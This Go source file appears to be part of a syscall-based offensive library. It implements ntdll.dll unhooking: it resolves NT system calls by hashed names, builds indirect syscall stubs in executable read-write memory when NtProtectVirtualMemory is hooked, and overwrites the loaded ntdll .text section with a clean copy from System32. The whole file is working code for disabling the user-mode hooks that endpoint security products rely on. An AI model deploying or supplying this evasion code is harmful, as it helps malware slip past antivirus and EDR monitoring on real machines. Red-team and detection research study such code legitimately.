package unhook

import (
	"fmt"
	"os"
	"runtime"
	"unsafe"
	"github.com/Binject/debug/pe"
	"github.com/carved4/go-native-syscall/pkg/syscallresolve"
	"github.com/carved4/go-native-syscall/pkg/syscall"
	"github.com/carved4/go-native-syscall/pkg/obf"
	"github.com/carved4/go-native-syscall/pkg/debug"
)

// protectMemoryWithDynamicSyscall changes memory protection using dynamic syscall if NtProtectVirtualMemory is hooked
func protectMemoryWithDynamicSyscall(process uintptr, baseAddr *uintptr, size *uintptr, newProtect uintptr, oldProtect *uintptr) error {
	ntProtectHash := obf.GetHash("NtProtectVirtualMemory")
	
	// Check if NtProtectVirtualMemory is hooked and get syscall number
	syscallNum, isHooked := syscallresolve.GetSyscallNumberWithHookHandling(ntProtectHash)
	if syscallNum == 0 {
		return fmt.Errorf("failed to resolve NtProtectVirtualMemory syscall number")
	}

	if isHooked {
		debug.Printfln("UNHOOK", "NtProtectVirtualMemory hooked, using dynamic stub\n")
		
		// Build a dynamic syscall stub
		stubBytes, err := syscallresolve.BuildDynamicSyscallStub(syscallNum)
		if err != nil {
			return fmt.Errorf("failed to build dynamic syscall stub: %v", err)
		}

		// Allocate executable memory for the stub
		stubAddr, err := allocateExecutableMemory(len(stubBytes))
		if err != nil {
			return fmt.Errorf("failed to allocate executable memory for syscall stub: %v", err)
		}
		defer freeExecutableMemory(stubAddr, len(stubBytes))

		// Copy the stub to executable memory
		for i, b := range stubBytes {
			*(*byte)(unsafe.Pointer(stubAddr + uintptr(i))) = b
		}
		runtime.KeepAlive(stubBytes)

		// Use indirect syscall with our custom stub
		result, err := syscall.IndirectSyscall(syscallNum, stubAddr, 
			process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(size)), 
			newProtect, uintptr(unsafe.Pointer(oldProtect)))
		
		runtime.KeepAlive(stubBytes)
		
		if err != nil {
			return fmt.Errorf("indirect syscall failed: %v", err)
		}
		
		if result != 0 {
			return fmt.Errorf("NtProtectVirtualMemory failed with status: 0x%X", result)
		}
		
		return nil
	} else {
		// Use direct syscall if not hooked
		result, err := syscall.Syscall(syscallNum, 
			process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(size)), 
			newProtect, uintptr(unsafe.Pointer(oldProtect)))
		
		if err != nil {
			return fmt.Errorf("direct syscall failed: %v", err)
		}
		
		if result != 0 {
			return fmt.Errorf("NtProtectVirtualMemory failed with status: 0x%X", result)
		}
		
		return nil
	}
}

// allocateExecutableMemory allocates memory with execute permissions
func allocateExecutableMemory(size int) (uintptr, error) {
	ntAllocateHash := obf.GetHash("NtAllocateVirtualMemory")
	syscallNum, _ := syscallresolve.GetSyscallNumberWithHookHandling(ntAllocateHash)
	if syscallNum == 0 {
		return 0, fmt.Errorf("failed to resolve NtAllocateVirtualMemory")
	}

	currentProcess := uintptr(0xffffffffffffffff)
	var baseAddr uintptr
	allocSize := uintptr(size)
	
	result, _ := syscall.Syscall(syscallNum, 
		currentProcess, uintptr(unsafe.Pointer(&baseAddr)), 0, 
		uintptr(unsafe.Pointer(&allocSize)), 0x3000, 0x40) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
	
	if result != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory failed with status: 0x%X", result)
	}
	
	return baseAddr, nil
}

// freeExecutableMemory frees previously allocated executable memory
func freeExecutableMemory(addr uintptr, size int) error {
	ntFreeHash := obf.GetHash("NtFreeVirtualMemory")
	syscallNum, _ := syscallresolve.GetSyscallNumberWithHookHandling(ntFreeHash)
	if syscallNum == 0 {
		return fmt.Errorf("failed to resolve NtFreeVirtualMemory")
	}

	currentProcess := uintptr(0xffffffffffffffff)
	baseAddr := addr
	freeSize := uintptr(0) // Free entire allocation
	
	result, _ := syscall.Syscall(syscallNum, 
		currentProcess, uintptr(unsafe.Pointer(&baseAddr)), 
		uintptr(unsafe.Pointer(&freeSize)), 0x8000) // MEM_RELEASE
	
	if result != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed with status: 0x%X", result)
	}
	
	return nil
}

func UnhookNtdll() error {
	// First, prewarm the syscall cache to ensure we have clean stubs
	err := syscallresolve.PrewarmSyscallCache()
	if err != nil {
		debug.Printfln("UNHOOK", "Warning: Failed to prewarm syscall cache: %v\n", err)
	}

	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllHandle := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllHandle == 0 {
		return fmt.Errorf("failed to get ntdll base address")
	}

	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = "C:\\Windows"
	}
	cleanNtdllPath := systemRoot + "\\System32\\ntdll.dll"
	
	cleanPE, err := pe.Open(cleanNtdllPath)
	if err != nil {
		return fmt.Errorf("failed to open clean ntdll from System32: %v", err)
	}
	defer cleanPE.Close()
	

	var textSection *pe.Section
	for _, section := range cleanPE.Sections {
		if section.Name == ".text" {
			textSection = section
			break
		}
	}
	if textSection == nil {
		return fmt.Errorf(".text section not found in clean ntdll")
	}
	cleanTextData, err := textSection.Data()
	if err != nil {
		return fmt.Errorf("failed to read .text section data: %v", err)
	}
	targetAddr := ntdllHandle + uintptr(textSection.VirtualAddress)
	textSize := uintptr(len(cleanTextData))
	maxSize := uintptr(textSection.Size)
	if textSize > maxSize {
		textSize = maxSize
	}
	currentProcess := uintptr(0xffffffffffffffff)	

	var oldProtect uintptr
	
	// Use our enhanced memory protection function that handles hooks
	err = protectMemoryWithDynamicSyscall(
		currentProcess,
		&targetAddr,
		&textSize,
		0x40, // PAGE_EXECUTE_READWRITE
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}
	
	if len(cleanTextData) == 0 {
		return fmt.Errorf("clean .text section data is empty")
	}
	
	// Copy the clean .text section using direct memory copy
	sourceAddr := uintptr(unsafe.Pointer(&cleanTextData[0]))
	runtime.KeepAlive(cleanTextData)
	
	// Direct memory copy without using potentially hooked APIs
	for i := uintptr(0); i < textSize; i++ {
		*(*byte)(unsafe.Pointer(targetAddr + i)) = *(*byte)(unsafe.Pointer(sourceAddr + i))
	}
	runtime.KeepAlive(cleanTextData)
	
	var dummy uintptr
	err = protectMemoryWithDynamicSyscall(
		currentProcess,
		&targetAddr,
		&textSize,
		oldProtect,
		&dummy,
	)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection: %v", err)
	}
	
	debug.Printfln("UNHOOK", "Unhooked ntdll.dll .text section (%d bytes)\n", textSize)
	return nil
}
